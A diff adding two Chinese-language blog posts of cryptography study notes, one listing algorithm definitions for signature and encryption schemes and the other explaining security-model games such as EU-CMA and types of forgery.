@@ -71,6 +71,919 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-密码学-算法定义" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E7%AE%97%E6%B3%95%E5%AE%9A%E4%B9%89/" class="article-date">
+  <time class="dt-published" datetime="2021-05-05T09:02:41.000Z" itemprop="datePublished">2021-05-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E7%AE%97%E6%B3%95%E5%AE%9A%E4%B9%89/">密码学-算法定义</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>算法定义需要考虑的问题。</p>
+<p>• 该密码概念涉及到哪几方 (entities)？ </p>
+<p>• 该密码概念需要几个算法来定义？</p>
+<p>• 每一个算法的名字, 即实现的功能是什么？</p>
+<p>• 每一个算法由哪一方 (entity) 来运行？</p>
+<p>• 每一个算法的输入和输出分别是什么？</p>
+<h3 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h3><p>Alice是singer，Bob是verifier</p>
+<h3 id="Digital-Signature-10"><a href="#Digital-Signature-10" class="headerlink" title="Digital Signature[10]"></a>Digital Signature[10]</h3><p>$SysGen(1^\lambda)\rightarrow SP$</p>
+<p>$KeyGen(SP)\rightarrow (pk,sk)$</p>
+<p>$Sign(SP,sk,M)\rightarrow\sigma_m$</p>
+<p>$Verify(SP,pk,M,\sigma_M)\rightarrow 1/0$</p>
+<h3 id="Online-Offline-Signature-13"><a href="#Online-Offline-Signature-13" class="headerlink" title="Online/Offline Signature[13]"></a>Online/Offline Signature[13]</h3><p>将sign切割成两个函数</p>
+<p>$sign^{off}(SP,sk)\rightarrow\sigma^{off}$</p>
+<p>$sign^{on}(SP,\sigma^{off},m)\rightarrow m$</p>
+<p>要求online阶段签名的开销尽可能的小</p>
+<h3 id="Undeniable-Signature-14"><a href="#Undeniable-Signature-14" class="headerlink" title="Undeniable Signature[14]"></a>Undeniable Signature[14]</h3><p>只允许合法用户验签的一种签名。</p>
+<p>典型应用场景：防止用户复制软件。用户为signer，软件生厂商为verifier</p>
+<h4 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h4><p>$SysGen(1^\lambda)\rightarrow SP$</p>
+<p>$KeyGen(SP)\rightarrow (pk,sk)$</p>
+<p>$Sign(SP,sk,M)\rightarrow\sigma_m$</p>
+<p>$RandGen(SP)\rightarrow k$</p>
+<p>$Verify1(SP,pk,\sigma_m,M,k)\rightarrow c$</p>
+<p>$Verify2(SP,sk,c)\rightarrow d$</p>
+<p>$Verify3(d,k)\rightarrow 1/0$</p>
+<h4 id="正确版本"><a href="#正确版本" class="headerlink" title="正确版本"></a>正确版本</h4><p>$KeyGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,M)\rightarrow\sigma_m$</p>
+<p>$Confirm(m,\sigma_m,pk,sk)$ 是一个多项式时间交互协议，证明$\sigma_m$是一个合法签名</p>
+<p>$Disavowal(m,\sigma_m,pk)$ 是一个多项式时间交互协议，证明$\sigma_m$不是一个合法签名</p>
+<h3 id="Designated-Verifier-Signature-15"><a href="#Designated-Verifier-Signature-15" class="headerlink" title="Designated Verifier Signature[15]"></a>Designated Verifier Signature[15]</h3><p>用于保证Bob不将签名发送给第三方Carol。Bob能仿造Alice的签名。Alice能向Carol证明Bob的签名是伪造的，但是不能否认Alice自己的签名。这在Alice和Bob的签名是计算上不可区分的前提下。</p>
+<h3 id="Digital-Signature-with-Signer-aided-Verifification-16"><a href="#Digital-Signature-with-Signer-aided-Verifification-16" class="headerlink" title="Digital Signature with Signer-aided Verifification[16]"></a>Digital Signature with Signer-aided Verifification[16]</h3><p>$Sign(sk_S,pk_v,m)\rightarrow\sigma$</p>
+<p>$Simul(pk_s,sk_v,m)\rightarrow\sigma$</p>
+<p>$Vrfy(pk_s,pk_v,m,\sigma)\rightarrow{accept,reject}$</p>
+<h3 id="Proxy-Signature-17"><a href="#Proxy-Signature-17" class="headerlink" title="Proxy Signature[17]"></a>Proxy Signature[17]</h3><p>分为三种：完全代表，部分代表，授权代表。只讨论授权代表</p>
+<h4 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h4><p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk_S,w)\rightarrow d$</p>
+<p>$ProxySign(sk_P,d,m)\rightarrow\sigma$</p>
+<p>$Vrfy(d,pk_P,\sigma)$</p>
+<h4 id="正确版本-1"><a href="#正确版本-1" class="headerlink" title="正确版本"></a>正确版本</h4><p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$StandSign(sk_S,M)\rightarrow \sigma_S$</p>
+<p>$DelegationGen(sk_S,W)\rightarrow\sigma_W$，其中W是warrant</p>
+<p>$ProxySign(sk_P,W,\sigma_W,M)\rightarrow\sigma_M$</p>
+<p>$Vrfy(pk_S,pk_P,W,M,\sigma_M)$</p>
+<h3 id="Certificateless-Signature-18"><a href="#Certificateless-Signature-18" class="headerlink" title="Certificateless Signature[18]"></a>Certificateless Signature[18]</h3><h3 id="Aggregate-Signature-19"><a href="#Aggregate-Signature-19" class="headerlink" title="Aggregate Signature[19]"></a>Aggregate Signature[19]</h3><h4 id="版本1-1"><a href="#版本1-1" class="headerlink" title="版本1"></a>版本1</h4><p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,m)\rightarrow\sigma$</p>
+<p>$Condense(\sigma_1,\ldots,\sigma_n)\rightarrow\sigma_0$</p>
+<p>$Vrfy((pk_1,m_1),\ldots,(pk_n,m_n),\sigma_0)\rightarrow{1,0}$</p>
+<h4 id="正确版本-2"><a href="#正确版本-2" class="headerlink" title="正确版本"></a>正确版本</h4><p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,m)\rightarrow\sigma$</p>
+<p>$Agg((pk_1,\sigma_1,m_1),\ldots,(pk_n,\sigma_n,m_n))\rightarrow\sigma$</p>
+<p>$Vrfy((pk_1,m_1),\ldots,(pk_n,m_n),\sigma_0)\rightarrow{1,0}$</p>
+<p>不需要Condense函数，直接将所有$\sigma$连接起来。</p>
+<h3 id="Digital-Signature-with-Batch-Verification-20"><a href="#Digital-Signature-with-Batch-Verification-20" class="headerlink" title="Digital Signature with Batch Verification[20]"></a>Digital Signature with Batch Verification[20]</h3><h3 id="Threshold-Signature-21"><a href="#Threshold-Signature-21" class="headerlink" title="Threshold Signature[21]"></a>Threshold Signature[21]</h3><h4 id="版本1-2"><a href="#版本1-2" class="headerlink" title="版本1"></a>版本1</h4><p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,m)\rightarrow\sigma$</p>
+<p>$Vrfy((pk_1,m_1),\ldots,(pk_n,m_n),\sigma_0)\rightarrow{1,0}$</p>
+<h4 id="正确版本-3"><a href="#正确版本-3" class="headerlink" title="正确版本"></a>正确版本</h4><p>$KGen(1^\lambda)\rightarrow (pk,(sk_1,\ldots,sk_n))$</p>
+<p>$Sign(sk_i,m)\rightarrow\sigma$</p>
+<p>$Vrfy(pk,m,\sigma)\rightarrow{1,0}$</p>
+<h3 id="Blind-Signature-22"><a href="#Blind-Signature-22" class="headerlink" title="Blind Signature[22]"></a>Blind Signature[22]</h3><p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$&lt;S(sk),U(pk,m)&gt;\rightarrow\sigma$ ，其中$S$是签名者，$U$是用户</p>
+<p>$Vrfy(pk,m,\sigma )\rightarrow{1,0}$</p>
+<h4 id="完备性"><a href="#完备性" class="headerlink" title="完备性"></a>完备性</h4><h3 id="Ring-Signature-23"><a href="#Ring-Signature-23" class="headerlink" title="Ring Signature[23]"></a>Ring Signature[23]</h3><p>签名后，只知道是群中某个人签名，但不知道具体是谁签的名</p>
+<p>与群签名对比：可以隐藏签名者的信息；不需要群组织者</p>
+<p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,m,R)\rightarrow\sigma$，其中$R=(pk_1,\ldots,pk_n)$，且对于任意的$s\in [1,n]$有$(pk_s,sk)$合法</p>
+<p>$Vrfy(M,\sigma,R)\rightarrow{1,0}$</p>
+<h3 id="Group-Signature-24"><a href="#Group-Signature-24" class="headerlink" title="Group Signature[24]"></a>Group Signature[24]</h3><h4 id="版本1-3"><a href="#版本1-3" class="headerlink" title="版本1"></a>版本1</h4><p>$GKeyGen(1^\lambda)\rightarrow(pk_g,sk_g)$ 生成群公钥和群私钥</p>
+<p>$UKeyGen(1^\lambda,pk_g)\rightarrow sk_i$</p>
+<p>$Sign(sk_i,m)\rightarrow\sigma_i$</p>
+<p>$Extr(\sigma_i,sk_g)\rightarrow id$</p>
+<h4 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h4><p>$KGen(1^\lambda)\rightarrow(gpk,gmsk,gsk)$，其中$gpk$是群公钥，gmsk是群管理者的私钥，gsk是一个n维向量，每一维代表一个用户的私钥$gsk[i]$</p>
+<p>$Sign(gsk[i],m)\rightarrow\sigma$</p>
+<p>$Vrfy(gpk,m,\sigma)\rightarrow{1,0}$</p>
+<p>$Open(gmsk,m,\sigma)\rightarrow{id,\bot}$</p>
+<h3 id="Identity-based-Signature-25"><a href="#Identity-based-Signature-25" class="headerlink" title="Identity-based Signature[25]"></a>Identity-based Signature[25]</h3><h4 id="版本1-4"><a href="#版本1-4" class="headerlink" title="版本1"></a>版本1</h4><p>参与方：master，user，verifier</p>
+<p>$MKeyGen(1^\lambda)\rightarrow(msk,mpk)$</p>
+<p>$UKeyGen(id,msk,mpk)\rightarrow sk_{id}$</p>
+<p>$Sign(sk_{id},m)\rightarrow\sigma$</p>
+<p>$Vrfy(mpk,m,\sigma,id)\rightarrow{1,0}$</p>
+<p>和定义无明显出入</p>
+<h3 id="Attribute-based-Signature-26"><a href="#Attribute-based-Signature-26" class="headerlink" title="Attribute-based Signature[26]"></a>Attribute-based Signature[26]</h3><p>一种更为普适的identity-based signature，定义无太大差别不赘述</p>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><h3 id="Public-Key-Encryption-12"><a href="#Public-Key-Encryption-12" class="headerlink" title="Public-Key Encryption[12]"></a>Public-Key Encryption[12]</h3><p>$SysGen(1^\lambda)\rightarrow SP$</p>
+<p>$KeyGen(SP)\rightarrow(pk,sk)$</p>
+<p>$Enc(SP,pk,M)\rightarrow CT$</p>
+<p>$Dec(SP,sk,CT)\rightarrow M$</p>
+<h3 id="Broadcast-Encryption-27"><a href="#Broadcast-Encryption-27" class="headerlink" title="Broadcast Encryption[27]"></a>Broadcast Encryption[27]</h3><p>某个子集$S$中的所有用户都可以对密文进行解密</p>
+<h4 id="版本1-5"><a href="#版本1-5" class="headerlink" title="版本1"></a>版本1</h4><p>$KGen(1^\lambda)\rightarrow(pk,SK)$，其中$SK={sk_1,\ldots,sk_n}$</p>
+<p>$Enc(S,pk,M)\rightarrow CT$</p>
+<p>$Dec(sk_i,CT)\rightarrow M$</p>
+<h4 id="正确版本-4"><a href="#正确版本-4" class="headerlink" title="正确版本"></a>正确版本</h4><p>$KGen(1^\lambda)\rightarrow(pk,SK)$，其中$SK={sk_1,\ldots,sk_n}$</p>
+<p>$Enc(S,pk)\rightarrow (h,K)$，h是广播报文头部，K是对称加密秘钥</p>
+<p>$Enc2(K,M)\rightarrow CT$，是一个对称加密算法</p>
+<p>$Dec(S,i,sk_i,h,pk)\rightarrow K$</p>
+<p>$Dec2(K,CT)\rightarrow M$</p>
+<h3 id="Identity-based-Encryption-28"><a href="#Identity-based-Encryption-28" class="headerlink" title="Identity-based Encryption[28]"></a>Identity-based Encryption[28]</h3><h4 id="正确版本-5"><a href="#正确版本-5" class="headerlink" title="正确版本"></a>正确版本</h4><p>$Setup(k)\rightarrow(params,msk)$</p>
+<p>$Extract(params,msk,ID)\rightarrow sk_{ID}$</p>
+<p>$Enc(params,ID,M)\rightarrow CT$</p>
+<p>$Dec(params,ID,CT,sk_{ID})\rightarrow M$</p>
+<h3 id="Identity-based-Encryption-with-Traitor-Tracing-29"><a href="#Identity-based-Encryption-with-Traitor-Tracing-29" class="headerlink" title="Identity-based Encryption with Traitor Tracing[29]"></a>Identity-based Encryption with Traitor Tracing[29]</h3><h4 id="正确版本-6"><a href="#正确版本-6" class="headerlink" title="正确版本"></a>正确版本</h4><p>$KeyGen(1^\lambda)\rightarrow(mpk,msk)$</p>
+<p>$Extr(msk,ID,i)\rightarrow sk_i$</p>
+<p>$Enc(mpk,ID,M)\rightarrow CT$</p>
+<p>$Dec(sk_i,ID,CT)\rightarrow M$</p>
+<p>$Trace(msk,ID)\rightarrow T$，其中$T={id_i}$为叛徒的集合</p>
+<h3 id="Identity-based-Broadcast-Encryption-30"><a href="#Identity-based-Broadcast-Encryption-30" class="headerlink" title="Identity-based Broadcast Encryption[30]"></a>Identity-based Broadcast Encryption[30]</h3><p>PKG、Alice、Bob</p>
+<p>$KGen(1^\lambda)\rightarrow(msk,mpk)$</p>
+<p>$Extr(msk,ID)\rightarrow sk_{i}$</p>
+<p>$Enc(S,pk)\rightarrow (h,K)$，h是广播报文头部，K是对称加密秘钥</p>
+<p>$Enc2(K,M)\rightarrow CT$，是一个对称加密算法</p>
+<p>$Dec(S,i,sk_i,h,pk)\rightarrow K$</p>
+<p>$Dec2(K,CT)\rightarrow M$</p>
+<h3 id="Inner-Product-Encryption-31"><a href="#Inner-Product-Encryption-31" class="headerlink" title="Inner Product Encryption[31]"></a>Inner Product Encryption[31]</h3><p>$Setup(1^\lambda)\rightarrow(pk,sk)$</p>
+<p>$KeyGen(\vec{v},pk,sk)\rightarrow sk_{\vec{v}}$</p>
+<p>$Enc(M,\vec{x},pk)\rightarrow CT_{\vec{x}}$</p>
+<p>$Dec(CT_{\vec{x}},sk_{\vec{v}},pk)$</p>
+<h3 id="Attribute-based-Encryption-32-33"><a href="#Attribute-based-Encryption-32-33" class="headerlink" title="Attribute-based Encryption[32, 33]"></a>Attribute-based Encryption[32, 33]</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E7%AE%97%E6%B3%95%E5%AE%9A%E4%B9%89/" data-id="ckob8gj4c0000hsus8rxacojn" data-title="密码学-算法定义" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-密码学-安全模型定义" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89/" class="article-date">
+  <time class="dt-published" datetime="2021-05-05T09:01:26.000Z" itemprop="datePublished">2021-05-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89/">密码学-安全模型定义</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>步骤</p>
+<ol>
+<li>定义安全特性</li>
+<li>描述game</li>
+</ol>
+<p>安全模型一般是通过一个游戏 (game) 来定义, 游戏涉及到挑战者 (challenger) 和敌手 (adversary)</p>
+<p>两方的交互. 简单地说, 就是挑战者运行一个相应的方案让敌手进行攻击. 安全模型抽象地定义了敌手可</p>
+<p>询问的内容, 并形式化定义了挑战者的安全目标. 一个完整的安全模型可以分为以下四个部分进行理解. </p>
+<p>• 初始化 (setup): 挑战者初始化整个系统, 保存系统用于应答 (response) 的秘密参数 (比如: 私钥),</p>
+<p>并将公开参数 (比如: 公钥) 返回给敌手. </p>
+<p>• 询问 (query): 安全模型通过敌手询问和挑战者应答的方式来抽象现实世界中敌手的攻击. 考虑现</p>
+<p>实世界中敌手通过攻击可能得到的结果, 安全模型的定义跳过攻击过程, 直接允许敌手向挑战者发</p>
+<p>出相应的攻击结果询问, 挑战者需要正确回答敌手的询问. 例如, 对于公钥加密, 如果假设敌手在</p>
+<p>现实世界中能够获得任意密文对应的明文, 则在对应的安全模型定义中允许敌手询问密文对应的</p>
+<p>明文, 挑战者必须返回正确的解密结果. 敌手询问的内容以及时间的不同代表着敌手能力大小的不</p>
+<p>同. 越强的安全模型应该允许敌手做更多更自由的询问. 有些文章在安全模型定义中把敌手的询</p>
+<p>问对象 (即挑战者) 描述为谕言机 (oracle). 这种定义描述上稍有差别, 但本质不变. </p>
+<p>• 攻击 (attack): 敌手向挑战者发起攻击挑战. 挑战的对象就是挑战者的安全目标. 敌手成功攻破安</p>
+<p>全目标即定义为敌手赢得游戏. 安全目标可以分为两大类: 不可计算性的安全目标和不可区分性</p>
+<p>的安全目标. 详细的安全目标的定义和安全需求息息相关. 例如, 数字签名安全模型的安全目标是</p>
+<p>签名的不可伪造性, 公钥加密安全模型的安全目标是密文的不可区分性. </p>
+<p>• 优势 (advantage): 安全模型的最后一步是对优势 <em>ϵ</em> 的定义. 这里涉及到一个非常重要的概念区</p>
+<p>分, 即优势和概率. 在安全模型的定义中, 敌手有一个赢得游戏的理想化概率. 例如, 在数字签名的</p>
+<p>EU-CMA 安全模型中, 敌手伪造一个签名的理想化概率是 0, 在公钥加密的 IND 模型中, 敌手猜</p>
+<p>对挑战密文所对应明文的理想化概率是 1</p>
+<p>2 . 优势是对一个攻击算法或一个求解算法, 相较于理想化</p>
+<p>概率有多少更多的可能性, 成功攻破一个方案或成功解决一个问题的度量. 而概率是对一个事件发</p>
+<p>生的可能性的度量. 有了优势这个概念, 我们就可以用可忽略和不可忽略来区分一个方案安全与</p>
+<p>否</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="security-model"><a href="#security-model" class="headerlink" title="security model"></a>security model</h3><p>​    针对加密系统的多种攻击方式的抽象。通常被视为challenger和adversary之间的游戏</p>
+<h3 id="challenger"><a href="#challenger" class="headerlink" title="challenger"></a>challenger</h3><p>​    一个虚拟的实体，用于与攻击者adversary交互</p>
+<h3 id="adversary"><a href="#adversary" class="headerlink" title="adversary"></a>adversary</h3><p>​    攻击者，通常为PPT攻击者</p>
+<h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><p>​    攻击者询问信息</p>
+<h3 id="response"><a href="#response" class="headerlink" title="response"></a>response</h3><p>​    挑战者回应信息</p>
+<h3 id="win"><a href="#win" class="headerlink" title="win"></a>win</h3><p>​    攻击者攻破方案，获得胜利，说明方案是不安全的</p>
+<h3 id="adaptive-attack"><a href="#adaptive-attack" class="headerlink" title="adaptive attack"></a>adaptive attack</h3><h3 id="trivial-attack"><a href="#trivial-attack" class="headerlink" title="trivial attack"></a>trivial attack</h3><h3 id="advantage"><a href="#advantage" class="headerlink" title="advantage"></a>advantage</h3><p>​    攻击者攻破方案的概率</p>
+<h3 id="strong-security-model"><a href="#strong-security-model" class="headerlink" title="strong security model"></a>strong security model</h3><p>​    除了能引起trivial attack的询问，攻击者询问的信息不受限制</p>
+<h3 id="weak-security-model"><a href="#weak-security-model" class="headerlink" title="weak security model"></a>weak security model</h3><p>​    攻击者被限定只能询问指定的信息</p>
+<h3 id="standard-security-model"><a href="#standard-security-model" class="headerlink" title="standard security model"></a>standard security model</h3><p>​    被广泛接受的安全模型</p>
+<h2 id="攻击能力"><a href="#攻击能力" class="headerlink" title="攻击能力"></a>攻击能力</h2><p>假设攻击者为A(lice)，签名者为Bob</p>
+<p>Key-only attack </p>
+<p>​    Alice只知道Bob的公钥$pk_B$</p>
+<p>Message attack</p>
+<p>​    Alice在实施攻击前，能够询问一些明文的签名</p>
+<p>known-message attack</p>
+<p>​    Alice可以知道一个明文集合$M={m_1,\ldots,m_n}$的签名，但是$M$不是Alice选择的</p>
+<p>generic chosen-message attack</p>
+<p>​    Alice可以知道一个明文集合$M={m_1,\ldots,m_n}$的签名，$M$是Alice选择的，但$M$与Bob的公钥无关</p>
+<p>Directed chosen-message attack</p>
+<p>​    Alice可以知道一个明文集合$M={m_1,\ldots,m_n}$的签名，$M$是Alice选择的，$M$可以在Alice知道Bob的公钥后生成</p>
+<p>Adaptive chosen-mesage attack</p>
+<p>​    Alice可以将Bob作为预言机使用，这意味着$M$不仅可以给予Bob的公钥，也可以给予之前已经询问过的明文</p>
+<h2 id="破坏方案"><a href="#破坏方案" class="headerlink" title="破坏方案"></a>破坏方案</h2><p>a total break</p>
+<p>​    计算出A的私钥</p>
+<p>universal forgery</p>
+<p>​    找到一个有效函数f，等价于Bob的签名算法</p>
+<p>selective forgery</p>
+<p>​    针对特定消息，伪造一个签名</p>
+<p>existential forgery</p>
+<p>​    至少能对一个消息M，伪造合法签名</p>
+<h3 id="Digital-Signature-10"><a href="#Digital-Signature-10" class="headerlink" title="Digital Signature[10]"></a>Digital Signature[10]</h3><p>$SysGen(1^\lambda)\rightarrow SP$</p>
+<p>$KeyGen(SP)\rightarrow (pk,sk)$</p>
+<p>$Sign(SP,sk,M)\rightarrow\sigma_m$</p>
+<p>$Verify(SP,pk,M,\sigma_M)\rightarrow 1/0$</p>
+<h4 id="EU-CMA"><a href="#EU-CMA" class="headerlink" title="EU-CMA"></a>EU-CMA</h4><p>如果一个数字签名是EU-CMA安全的，当且仅当对于任意的PPT攻击者$A$和挑战者$C$，在以下游戏中获胜的概率可以忽略</p>
+<p>$Setup$. $C$执行$KeyGen(SP)$得到公私钥$(pk,sk)$，并将公私钥发送给攻击者A，保留$sk$用于应对A的询问</p>
+<p>$Query$.A自由查询签名，对于任意消息$m_i$，挑战者$C$将签名$\sigma_i\leftarrow Sign(sk,M)$发送给A</p>
+<p>$Forgery$.攻击者输出消息-签名对$(m^*,\sigma_{m^*})$，若等式<br>$$<br>Verify(SP,pk,m^*,\sigma_{m^*}):<br>m\notin{m_1,\ldots,m_n}<br>$$<br>成立，则攻击者获胜</p>
+<h4 id="SU-EMA"><a href="#SU-EMA" class="headerlink" title="SU-EMA"></a>SU-EMA</h4><p>$$<br>Verify(SP,pk,m^*,\sigma_{m^*}):<br>(m^*.\sigma_{m^*})\notin{(m_1,\sigma_1),\ldots,(m_n,\sigma_n)}<br>$$</p>
+<h4 id="EU-RMA"><a href="#EU-RMA" class="headerlink" title="EU-RMA"></a>EU-RMA</h4><p>​    random-message attack</p>
+<p>如果一个数字签名是EU-RMA安全的，当且仅当对于任意的PPT攻击者$A$和挑战者$C$，在以下游戏中获胜的概率可以忽略</p>
+<p>$Setup$. $C$执行$KeyGen(SP)$得到公私钥$(pk,sk)$，并将公私钥发送给攻击者A，保留$sk$用于应对A的询问</p>
+<p>$Query$.A自由查询签名，对于任意消息$m_i$，挑战者$C$将签名$\sigma_i\leftarrow Sign(sk,M)$发送给A</p>
+<p>$Forgery$.攻击者输出消息-签名对$(m^*,\sigma_{m^*})$，若等式<br>$$<br>Verify(SP,pk,m^*,\sigma_{m^*}):<br>m\notin{m_1,\ldots,m_n}<br>$$<br>成立，则攻击者获胜</p>
+<h4 id="EU-KMA"><a href="#EU-KMA" class="headerlink" title="EU-KMA"></a>EU-KMA</h4><h3 id="Online-Offline-Signature-13"><a href="#Online-Offline-Signature-13" class="headerlink" title="Online/Offline Signature[13]"></a>Online/Offline Signature[13]</h3><p>将sign切割成两个函数</p>
+<p>$sign^{off}(SP,sk)\rightarrow\sigma^{off}$</p>
+<p>$sign^{on}(SP,\sigma^{off},m)\rightarrow\sigma$</p>
+<p>要求online阶段签名的开销尽可能的小</p>
+<h4 id="EU-CMA-1"><a href="#EU-CMA-1" class="headerlink" title="EU-CMA"></a>EU-CMA</h4><p>与一般的digital signature无明显区别</p>
+<h5 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h5><p>如果一个在线/离线数字签名是EU-CMA安全的，当且仅当对于任意的PPT攻击者$A$和挑战者$C$，在以下游戏中获胜的概率可以忽略</p>
+<p>$Setup$. $C$执行$KeyGen(SP)$得到公私钥$(pk,sk)$，并将公私钥发送给攻击者A，保留$sk$用于应对A的询问</p>
+<p>$Query$.A自由查询签名，对于任意消息$m_i$，挑战者$C$将签名$\sigma_i\leftarrow Sign(sk,M)$发送给A</p>
+<p>$Forgery$.攻击者输出消息-签名对$(m^*,\sigma_{m^*})$，若等式<br>$$<br>Verify(SP,pk,m^*,\sigma_{m^*}):<br>m\notin{m_1,\ldots,m_n}<br>$$<br>成立，则攻击者获胜</p>
+<h3 id="Undeniable-Signature-14"><a href="#Undeniable-Signature-14" class="headerlink" title="Undeniable Signature[14]"></a>Undeniable Signature[14]</h3><p>只允许合法用户验签的一种签名。</p>
+<p>典型应用场景：防止用户复制软件。用户为signer，软件生厂商为verifier</p>
+<h4 id="算法定义"><a href="#算法定义" class="headerlink" title="算法定义"></a>算法定义</h4><p>$KeyGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,M)\rightarrow\sigma_m$</p>
+<p>$Confirm(m,\sigma_m,pk,sk)$ 是一个多项式时间交互协议，证明$\sigma_m$是一个合法签名</p>
+<p>$Disavowal(m,\sigma_m,pk)$ 是一个多项式时间交互协议，证明$\sigma_m$不是一个合法签名</p>
+<h4 id="EU-CMA-2"><a href="#EU-CMA-2" class="headerlink" title="EU-CMA"></a>EU-CMA</h4><p>与原始的数字签名类似，但攻击者A还拥有询问Confirm和Disavowal预言机的能力</p>
+<h3 id="Designated-Verifier-Signature-15"><a href="#Designated-Verifier-Signature-15" class="headerlink" title="Designated Verifier Signature[15]"></a>Designated Verifier Signature[15]</h3><p>用于保证Bob不将签名发送给第三方Carol。Bob能仿造Alice的签名。Alice能向Carol证明Bob的签名是伪造的，但是不能否认Alice自己的签名。这在Alice和Bob的签名是计算上不可区分的前提下。</p>
+<p>$Sign(sk_S,pk_v,m)\rightarrow\sigma$</p>
+<p>$Simul(pk_s,sk_v,m)\rightarrow\sigma$</p>
+<p>$Vrfy(pk_s,pk_v,m,\sigma)\rightarrow{accept,reject}$</p>
+<h4 id="Non-transferable"><a href="#Non-transferable" class="headerlink" title="Non-transferable"></a>Non-transferable</h4><p>$(\tau,q_h,q_s,\xi)-forge$是指在$\tau$时间内，运行$q_h$次哈希询问，$q_s$次签名和模拟函数</p>
+<h3 id="Digital-Signature-with-Signer-aided-Verifification-16"><a href="#Digital-Signature-with-Signer-aided-Verifification-16" class="headerlink" title="Digital Signature with Signer-aided Verifification[16]"></a><u>Digital Signature with Signer-aided Verifification[16]</u></h3><p>$Sign(sk_S,pk_v,m)\rightarrow\sigma$</p>
+<p>$Simul(pk_s,sk_v,m)\rightarrow\sigma$</p>
+<p>$Vrfy(pk_s,pk_v,m,\sigma)\rightarrow{accept,reject}$</p>
+<h4 id="unconditionaly-secure"><a href="#unconditionaly-secure" class="headerlink" title="unconditionaly secure"></a>unconditionaly secure</h4><p>$Pr[invalid\leftarrow Verify[m,\sigma_m,pk]\leftarrow SAV[m,\sigma_m,pk]]$，敌手拥有无限计算能力</p>
+<p>[4] Girault, M. and Lefranc, D. (2005) Server-Aided Verifification:</p>
+<p>Theory and Practice. <em>Proc. ASIACRYPT 05</em>, Chennai, India,</p>
+<p>December 4–8, pp. 605–623. Springer, Berlin.</p>
+<p>[5] Wu, W., Mu, Y., Susilo, W. and Huang, X. (2008) Server-Aided</p>
+<p>Verifification Signatures: Defifinitions and New Constructions.</p>
+<p><em>Proc. ProvSec 08</em>, Shanghai, China, October 30–November 1,</p>
+<p>pp. 141–155. Springer, Berlin.</p>
+<p>[6] Chow, S.S.M., Au, M.H. and Susilo, W. (2011) Server-Aided</p>
+<p>Signatures Verifification Secure Against Collusion Attack. <em>Proc.</em></p>
+<p><em>ASIACCS 11</em>, Hong Kong, China, March 22–24, pp. 401–405.</p>
+<p>ACM, USA.</p>
+<h3 id="Proxy-Signature-17"><a href="#Proxy-Signature-17" class="headerlink" title="Proxy Signature[17]"></a>Proxy Signature[17]</h3><p>分为三种：完全代表，部分代表，授权代表。只讨论授权代表</p>
+<h4 id="算法定义-1"><a href="#算法定义-1" class="headerlink" title="算法定义"></a>算法定义</h4><p>涉及三方：原始签名者Alice，代理签名者Bob，验证者</p>
+<p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$StandSign(sk_A,M)\rightarrow \sigma_A$</p>
+<p>$DelegationGen(sk_A,W)\rightarrow\sigma_W$，其中W是warrant</p>
+<p>$ProxySign(sk_B,W,\sigma_W,M)\rightarrow\sigma_B$</p>
+<p>$Vrfy(pk_A,pk_B,W,M,\sigma_B)$</p>
+<h4 id="EU-CMA-3"><a href="#EU-CMA-3" class="headerlink" title="EU-CMA"></a>EU-CMA</h4><p>$A_{I}:pk_A,pk_B$</p>
+<p>$A_{II}:pk_A,pk_B,sk_B$</p>
+<p>$A_{III}:pk_A,pk_B,sk_A$</p>
+<p>existential unforgeability against adaptive $A_{II}$ Adversary</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义proxySignature1.jpg" alt="安全模型定义proxySignature1"></p>
